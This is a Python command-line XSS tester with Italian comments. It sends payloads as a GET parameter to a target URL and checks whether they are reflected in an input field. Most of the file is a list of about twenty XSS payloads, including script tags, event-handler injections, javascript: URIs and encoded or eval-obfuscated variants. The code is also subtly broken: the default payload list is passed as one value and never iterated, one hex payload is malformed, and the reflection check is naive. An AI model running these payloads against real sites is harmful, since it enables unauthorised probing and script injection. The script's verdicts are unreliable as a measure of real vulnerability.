import argparse
import requests
from bs4 import BeautifulSoup

def xss_tester(url, payload):
    # Invia payload come richiesta GET
    response = requests.get(url, params={"input": payload})

    # parase dell'HTML
    soup = BeautifulSoup(response.text, "html.parser")

    # trova input nell HTML
    input_element = soup.find("input", attrs={"name": "input"})

    if input_element:
        # restituisce l'attributo value dell'elemento di input
        # se corrisponde al payload, è vulnerabile all' XSS
        return input_element["value"] == payload
    else:
        # restituisce False se l'elemento di input non è stato trovato
        return False

# payload predefiniti da utilizzare se l'utente non ne specifica uno
default_payloads = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg onload=alert('XSS')>",
    "javascript:alert('XSS')",
    "<body onload=alert('XSS')>",
    "onerror=alert('XSS')",
    "<a href='javascript:alert('XSS')'>click me</a>",
    "<script>prompt('XSS')</script>",
    "%253cscript%253ealert('XSS')%253c%252fscript%253e",
    "0x3c7363726970743e616c6572742827587327329%3c2f7363726970743e",
    "<iframe src=javascript:alert('XSS')></iframe>",
    "';alert('XSS');//",
    "<img src='http://example.com/xss.png' onerror=alert('XSS')>",
    "<img src='http://example.com/xss.png' onload=alert('XSS')>",
    "<img src='http://example.com/xss.png' onmouseover=alert('XSS')>",
    "<b onclick=alert('XSS')>click me</b>",
    "<!--[if gte IE 4]><SCRIPT>alert('XSS');</SCRIPT><![endif]-->",
    "<!--[if lte IE 6]><SCRIPT>alert('XSS');</SCRIPT><![endif]-->",
    "eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))",
    "javascript:window.onerror=alert;throw%20new%20Error('XSS')",
    "<script>document.querySelector('#vulnerable-input').value='<script>alert(\"XSS\")</script>'</script>",
    "<script>eval(document.querySelector('#secret-input').value)</script>",

]

# analizza l'URL e gli argomenti del payload
parser = argparse.ArgumentParser(description="XSS Tester")
parser.add_argument("url", help="Url da testare")
parser.add_argument("payload", nargs="?", default=default_payloads,
                    help="Payload da testare")
args = parser.parse_args()

# verifica la vulnerabilità XSS dell'URL specificato
if xss_tester(args.url, args.payload):
    print("\033[31mQuesto URL è vulnerabile agli XSS con il payload: \033[0m", args.payload)
else:
    print("\033[32mQuesto URL NON è vulnerabile agli XSS con il payload: \033[0m", args.payload)